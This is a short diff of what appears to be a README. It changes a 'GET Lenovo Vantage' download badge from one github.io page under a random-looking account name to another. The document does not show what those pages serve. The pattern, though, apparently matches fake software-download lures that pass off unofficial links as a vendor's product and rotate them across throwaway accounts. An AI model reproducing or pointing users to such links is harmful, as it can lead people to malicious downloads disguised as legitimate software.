@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://i.ytimg.com/vi/PHnIR12ddMo/maxresdefault.jpg)
 
-[![GET Lenovo Vantage](https://img.shields.io/badge/GET%20%E2%80%94%20Lenovo%20Vantage-0078D6?style=for-the-badge&logoColor=white)](https://bradleyschmittxbrh.github.io/.github/lenovo-vantage)
+[![GET Lenovo Vantage](https://img.shields.io/badge/GET%20%E2%80%94%20Lenovo%20Vantage-0078D6?style=for-the-badge&logoColor=white)](https://denvertruongmosb.github.io/.github/lenovo-vantage)
 
 ---
 
